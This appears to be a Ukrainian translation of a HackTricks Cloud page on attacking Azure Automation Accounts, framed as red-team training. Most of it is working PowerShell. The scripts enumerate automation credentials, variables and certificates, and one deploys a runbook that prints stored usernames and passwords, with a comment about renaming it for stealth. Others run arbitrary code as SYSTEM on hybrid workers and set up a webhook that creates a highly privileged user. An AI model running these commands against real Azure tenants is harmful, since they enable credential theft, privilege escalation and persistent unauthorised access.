# Az - –û–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

[–ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó:](https://learn.microsoft.com/en-us/azure/automation/overview) Azure Automation –Ω–∞–¥–∞—î —Ö–º–∞—Ä–Ω–∏–π —Å–µ—Ä–≤—ñ—Å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó, –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ —Ç–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó, —è–∫–∏–π –ø—ñ–¥—Ç—Ä–∏–º—É—î –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–µ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —É –≤–∞—à–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ Azure —Ç–∞ –ø–æ–∑–∞ –Ω–∏–º. –í—ñ–Ω –≤–∫–ª—é—á–∞—î –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—é –ø—Ä–æ—Ü–µ—Å—ñ–≤, —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—î—é, —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –æ–Ω–æ–≤–ª–µ–Ω–Ω—è–º–∏, —Å–ø—ñ–ª—å–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≥–µ—Ç–µ—Ä–æ–≥–µ–Ω–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó.

–¶–µ —Å—Ö–æ–∂–µ –Ω–∞ "**–∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è**" –≤ Azure, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∞–º –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Ä–µ—á—ñ (–¥—ñ—ó –∞–±–æ –Ω–∞–≤—ñ—Ç—å —Å–∫—Ä–∏–ø—Ç–∏) –¥–ª—è **—É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è**, –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è **—Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ Azure**.

### –û–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å Run As

–ö–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **–û–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å Run as**, –≤—ñ–Ω —Å—Ç–≤–æ—Ä—é—î –¥–æ–¥–∞—Ç–æ–∫ Azure AD –∑ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, —Å—Ç–≤–æ—Ä—é—î **—Å–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª** —Ç–∞ –Ω–∞–¥–∞—î —Ä–æ–ª—å **Contributor** –¥–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –≤ **–ø–æ—Ç–æ—á–Ω—ñ–π –ø—ñ–¥–ø–∏—Å—Ü—ñ** Azure (–±–∞–≥–∞—Ç–æ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤).\
Microsoft —Ä–µ–∫–æ–º–µ–Ω–¥—É—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–£–ø—Ä–∞–≤–ª—ñ–Ω—Å—å–∫—É —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å** –¥–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó.

{% hint style="warning" %}
–¶–µ –±—É–¥–µ **–≤–∏–¥–∞–ª–µ–Ω–æ 30 –≤–µ—Ä–µ—Å–Ω—è 2023 —Ä–æ–∫—É —Ç–∞ –∑–∞–º—ñ–Ω–µ–Ω–æ –Ω–∞ –£–ø—Ä–∞–≤–ª—ñ–Ω—Å—å–∫—ñ —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ.**
{% endhint %}

## Runbooks —Ç–∞ –†–æ–±–æ—Ç–∏

**Runbooks** –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∞–º **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ PowerShell**. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ **–∑–ª–æ–≤–∂–∏–≤–∞–Ω–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º** –¥–ª—è –∫—Ä–∞–¥—ñ–∂–∫–∏ –¥–æ–∑–≤–æ–ª—ñ–≤ **–ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞** (—è–∫—â–æ —Ç–∞–∫–∏–π —î).\
–£ **–∫–æ–¥—ñ** **Runbooks** –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** (—Ç–∞–∫—É —è–∫ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ).

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **—á–∏—Ç–∞—Ç–∏** **—Ä–æ–±–æ—Ç–∏**, –∑—Ä–æ–±—ñ—Ç—å —Ü–µ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ **–º—ñ—Å—Ç—è—Ç—å** **–≤–∏–≤—ñ–¥** –≤–∏–∫–æ–Ω–∞–Ω–Ω—è (–º–æ–∂–ª–∏–≤–∞ **—á—É—Ç–ª–∏–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**).

–ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ `–û–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó` --> `<–í–∏–±–µ—Ä—ñ—Ç—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó>` --> `Runbooks/–†–æ–±–æ—Ç–∏/–ì—ñ–±—Ä–∏–¥–Ω—ñ —Ä–æ–±–æ—á—ñ –≥—Ä—É–ø–∏/–ó–∞–≤–¥–∞–Ω–Ω—è —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—á–∞/–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ/–ó–º—ñ–Ω–Ω—ñ/–°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏/–ó'—î–¥–Ω–∞–Ω–Ω—è`

### –ì—ñ–±—Ä–∏–¥–Ω–∏–π —Ä–æ–±—ñ—Ç–Ω–∏–∫

Runbook –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–ø—É—â–µ–Ω–∏–π –≤ **–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Azure** –∞–±–æ –≤ **–ì—ñ–±—Ä–∏–¥–Ω–æ–º—É —Ä–æ–±—ñ—Ç–Ω–∏–∫—É** (–º–∞—à–∏–Ω—ñ –ø–æ–∑–∞ Azure).\
–ù–∞ –í–ú –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∞–≥–µ–Ω—Ç Log Analytics –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –π–æ–≥–æ —è–∫ –≥—ñ–±—Ä–∏–¥–Ω–æ–≥–æ —Ä–æ–±—ñ—Ç–Ω–∏–∫–∞.\
–†–æ–±–æ—Ç–∏ –≥—ñ–±—Ä–∏–¥–Ω–æ–≥–æ —Ä–æ–±—ñ—Ç–Ω–∏–∫–∞ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è —è–∫ **SYSTEM** –Ω–∞ Windows —Ç–∞ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å **nxautomation** –Ω–∞ Linux.\
–ö–æ–∂–µ–Ω –ì—ñ–±—Ä–∏–¥–Ω–∏–π —Ä–æ–±—ñ—Ç–Ω–∏–∫ —Ä–µ—î—Å—Ç—Ä—É—î—Ç—å—Å—è –≤ **–ì—Ä—É–ø—ñ –≥—ñ–±—Ä–∏–¥–Ω–∏—Ö —Ä–æ–±—ñ—Ç–Ω–∏–∫—ñ–≤**.

–û—Ç–∂–µ, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–±—Ä–∞—Ç–∏ –∑–∞–ø—É—Å–∫ **Runbook** –≤ **–ì—ñ–±—Ä–∏–¥–Ω–æ–º—É —Ä–æ–±—ñ—Ç–Ω–∏–∫—É Windows**, –≤–∏ –≤–∏–∫–æ–Ω–∞—î—Ç–µ **–¥–æ–≤—ñ–ª—å–Ω—ñ –∫–æ–º–∞–Ω–¥–∏** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–æ–≤–Ω—ñ—à–Ω—å–æ—ó –º–∞—à–∏–Ω–∏ —è–∫ **System** (—á—É–¥–æ–≤–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –ø—ñ–≤–æ—Ç—É).

## –ö–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—è —Å—Ç–∞–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó (SC)

[–ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó:](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview) Azure Automation **State Configuration** - —Ü–µ —Å–ª—É–∂–±–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—î—é Azure, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º –ø–∏—Å–∞—Ç–∏, —É–ø—Ä–∞–≤–ª—è—Ç–∏ —Ç–∞ –∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó PowerShell Desired State Configuration (DSC) [configurations](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations) –¥–ª—è –≤—É–∑–ª—ñ–≤ —É –±—É–¥—å-—è–∫–æ–º—É —Ö–º–∞—Ä—ñ –∞–±–æ –≤ —Ü–µ–Ω—Ç—Ä—ñ –æ–±—Ä–æ–±–∫–∏ –¥–∞–Ω–∏—Ö –Ω–∞ –º—ñ—Å—Ü—ñ. –°–ª—É–∂–±–∞ —Ç–∞–∫–æ–∂ —ñ–º–ø–æ—Ä—Ç—É—î [DSC Resources](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources) —Ç–∞ –ø—Ä–∏–∑–Ω–∞—á–∞—î –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ü—ñ–ª—å–æ–≤–∏–º –≤—É–∑–ª–∞–º, –≤—Å–µ —Ü–µ –≤ —Ö–º–∞—Ä—ñ. –í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ Azure Automation State Configuration –≤ –ø–æ—Ä—Ç–∞–ª—ñ Azure, –≤–∏–±—Ä–∞–≤—à–∏ **State configuration (DSC)** –ø—ñ–¥ **–£–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—î—é**.

–£ —Ü–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è—Ö –º–æ–∂–µ –±—É—Ç–∏ –∑–Ω–∞–π–¥–µ–Ω–∞ **—á—É—Ç–ª–∏–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**.

### RCE

–ú–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ SC –¥–ª—è –∑–∞–ø—É—Å–∫—É –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Å–∫—Ä–∏–ø—Ç—ñ–≤ –Ω–∞ –∫–µ—Ä–æ–≤–∞–Ω–∏—Ö –º–∞—à–∏–Ω–∞—Ö.

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## –ü–µ—Ä–µ–ª—ñ–∫

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è Runbook

{% endcode %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
### –í–∏—Ç—è–≥–Ω–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö —Ç–∞ –∑–º—ñ–Ω–Ω–∏—Ö, –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä–æ–±–æ—á–æ–≥–æ –∑–æ—à–∏—Ç–∞

{% endcode %}
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% endcode %}

{% hint style="info" %}
–í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–µ —Å–∞–º–µ, –º–æ–¥–∏—Ñ—ñ–∫—É—é—á–∏ —ñ—Å–Ω—É—é—á–∏–π Run Book, –∞ —Ç–∞–∫–æ–∂ –∑ –≤–µ–±-–∫–æ–Ω—Å–æ–ª—ñ.
{% endhint %}

### –ö—Ä–æ–∫–∏ –¥–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–æ–≥–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏

#### 1. –Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó
- **–ù–µ–æ–±—Ö—ñ–¥–Ω–∞ –¥—ñ—è:** –°—Ç–≤–æ—Ä—ñ—Ç—å –Ω–æ–≤–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó.
- **–ö–æ–Ω–∫—Ä–µ—Ç–Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞:** –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ "–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É Azure Run As" —É–≤—ñ–º–∫–Ω–µ–Ω–æ.

#### 2. –Ü–º–ø–æ—Ä—Ç —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è Runbook
- **–î–∂–µ—Ä–µ–ª–æ:** –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∑—Ä–∞–∑–æ–∫ runbook –∑ [—Å—Ö–æ–≤–∏—â–∞ MicroBurst GitHub](https://github.com/NetSPI/MicroBurst).
- **–ù–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥—ñ—ó:**
- –Ü–º–ø–æ—Ä—Ç—É–π—Ç–µ runbook –≤ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó.
- –û–ø—É–±–ª—ñ–∫—É–π—Ç–µ runbook, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ –≤–∏–∫–æ–Ω–∞–≤—á–∏–º.
- –ü—Ä–∏–∫—Ä—ñ–ø—ñ—Ç—å webhook –¥–æ runbook, —É–≤—ñ–º–∫–Ω—É–≤—à–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ —Å–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è.

#### 3. –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –º–æ–¥—É–ª—è AzureAD
- **–ù–µ–æ–±—Ö—ñ–¥–Ω–∞ –¥—ñ—è:** –î–æ–¥–∞–π—Ç–µ –º–æ–¥—É–ª—å AzureAD –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó.
- **–î–æ–¥–∞—Ç–∫–æ–≤–∏–π –∫—Ä–æ–∫:** –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤—Å—ñ –º–æ–¥—É–ª—ñ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó Azure –æ–Ω–æ–≤–ª–µ–Ω—ñ –¥–æ –æ—Å—Ç–∞–Ω–Ω—ñ—Ö –≤–µ—Ä—Å—ñ–π.

#### 4. –ü—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—ñ–≤
- **–†–æ–ª—ñ –¥–ª—è –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—è:**
- –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
- –í–ª–∞—Å–Ω–∏–∫ –ø—ñ–¥–ø–∏—Å–∫–∏
- **–¶—ñ–ª—å:** –ü—Ä–∏–∑–Ω–∞—á—Ç–µ —Ü—ñ —Ä–æ–ª—ñ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó –¥–ª—è –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

#### 5. –£—Å–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –º–æ–∂–ª–∏–≤–æ—ó –≤—Ç—Ä–∞—Ç–∏ –¥–æ—Å—Ç—É–ø—É
- **–ü—Ä–∏–º—ñ—Ç–∫–∞:** –ë—É–¥—å—Ç–µ —É–≤–∞–∂–Ω—ñ, —â–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç–∞–∫–æ—ó –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –≤—Ç—Ä–∞—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é –Ω–∞–¥ –ø—ñ–¥–ø–∏—Å–∫–æ—é.

#### 6. –ó–∞–ø—É—Å–∫ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
- –ó–∞–ø—É—Å—Ç—ñ—Ç—å webhook –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ –∑–∞–ø–∏—Ç POST.
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –Ω–∞–¥–∞–Ω–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π PowerShell, –ø–µ—Ä–µ–∫–æ–Ω–∞–≤—à–∏—Å—å, —â–æ –∑–∞–º—ñ–Ω–∏—Ç–µ `$uri` –Ω–∞ —Ñ–∞–∫—Ç–∏—á–Ω–∏–π URL webhook —Ç–∞ –æ–Ω–æ–≤–∏—Ç–µ `$AccountInfo` —ñ–∑ –±–∞–∂–∞–Ω–∏–º —ñ–º'—è–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª–µ–º.
```powershell
$uri = "<YOUR_WEBHOOK_URL>"
$AccountInfo  = @(@{RequestBody=@{Username="<DESIRED_USERNAME>";Password="<DESIRED_PASSWORD>"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
